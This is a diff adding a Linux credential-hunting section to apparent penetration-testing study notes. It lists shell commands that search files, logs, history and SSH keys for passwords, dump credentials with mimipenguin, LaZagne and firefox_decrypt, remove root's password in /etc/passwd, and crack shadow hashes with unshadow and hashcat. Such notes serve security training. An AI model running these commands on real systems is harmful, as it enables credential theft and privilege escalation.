@@ -250,6 +250,124 @@ Brute force attacks involve attempting every conceivable combination of characte
 
 Rainbow table attacks involve using a pre-computed table of hashes and their corresponding plaintext passwords, which is a much faster method than a brute-force attack. However, this method is limited by the rainbow table size – the larger the table, the more passwords, and hashes it can store. Additionally, due to the nature of the attack, it is impossible to use rainbow tables to determine the plaintext of hashes not already included in the table. As a result, rainbow table attacks are only effective against hashes already present in the table, making the larger the table, the more successful the attack.
 
+## Linux Local Password Attacks
+
+### Credential hunting in Linux
+
+|Files|History|Memory|Key-Rings|
+|-----|-------|------|---------|
+|Configs|Logs|Cache|Browser stored credentials|
+|Databases|Command-line History|In-memory Processing|
+|Notes|
+|Scripts|
+|Source codes|
+|Cronjobs|
+|SSH Keys|
+
+|Log File|Description|
+|--------|-----------|
+|/var/log/messages|Generic system activity logs.|
+|/var/log/syslog|Generic system activity logs.|
+|/var/log/auth.log|(Debian) All authentication related logs.|
+|/var/log/secure|(RedHat/CentOS) All authentication related logs.|
+|/var/log/boot.log|Booting information.|
+|/var/log/dmesg|Hardware and drivers related information and logs.|
+|/var/log/kern.log|Kernel related warnings, errors and logs.|
+|/var/log/faillog|Failed login attempts.|
+|/var/log/cron|Information related to cron jobs.|
+|/var/log/mail.log|All mail server related logs.|
+|/var/log/httpd|All Apache related logs.|
+|/var/log/mysqld.log|All MySQL server related logs.|
+
+- `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done` seach for configuration files
+- `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done` search for "user", "password" and "pass" in all cnf files
+- `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done` search for database files
+- `find /home/* -type f -name "*.txt" -o ! -name "*.*"` search for files including the .txt file extension and files that have no file extension at all
+- `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done` search for scripts
+- `cat /etc/crontab` `ls -la /etc/cron.*/` search for cron jobs (might contain creds)
+- `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"` search for ssh private keys
+- `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"` search for ssh public keys
+- `tail -n5 /home/*/.bash*` search for files with .bash in the name
+- `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done` search for specific strings (accepted session opened session closed failure failed ssh password changed new user delete user sudo COMMAND= logs) in log files
+
+#### mimipenguin
+
+> Requires root privileges
+
+- [Repo of mimipenguin](https://github.com/huntergregal/mimipenguin)
+
+- `sudo python3 mimipenguin.py` or `sudo bash mimipenguin.sh`
+
+#### Lazagne
+
+- `sudo python2.7 laZagne.py all`
+
+#### Credentials in Browsers
+
+- `ls -l .mozilla/firefox/ | grep default` search for firefox files with credentials
+- `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .` print mozzilla creds file
+- `python3 laZagne.py browsers` with lazagne
+
+##### Firefox decrypt
+
+- [Repo](https://github.com/unode/firefox_decrypt)
+- `python3.9 firefox_decrypt.py` Decrypting Firefox Credentials
+
+### Passwd,Shadow & Opasswd
+
+#### Passwd
+
+If we change `root:x:0:0:root:/root:/bin/bash` for `root::0:0:root:/root:/bin/bash` root wont require a password if we use `su`
+
+#### Shadow File
+
+The format of this file is divided into nine fields:
+
+```bash
+cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
+```
+
+|Username|Encrypted password|Last PW change|Min. PW age|Max. PW age|Warning period|Inactivity period|Expiration date|Unused|
+|----|---|-|-|-|-|-|-|-|
+|`cry0l1t3`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`18937`|`0`|`99999`|`7`|||
+
+If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:
+
+`$<type>$<salt>$<hashed>`
+
+Algorithm Types
+
+- `$1$` – MD5
+- `$2a$` – Blowfish
+- `$2y$` – Eksblowfish
+- `$5$` – SHA-256
+- `$6$` – SHA-512
+
+#### Opasswd
+
+The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
+
+- `sudo cat /etc/security/opasswd`
+
+### Cracking Linux Credentials
+
+#### Unshadow
+
+```bash
+sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+```
+
+#### Hashcat - Cracking Unshadowed Hashes
+
+- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`
+
+#### Hashcat - Cracking MD5 Hashes
+
+- `cat md5-hashes.list`
+- `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`
+
 ## Resources
 
 - [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)
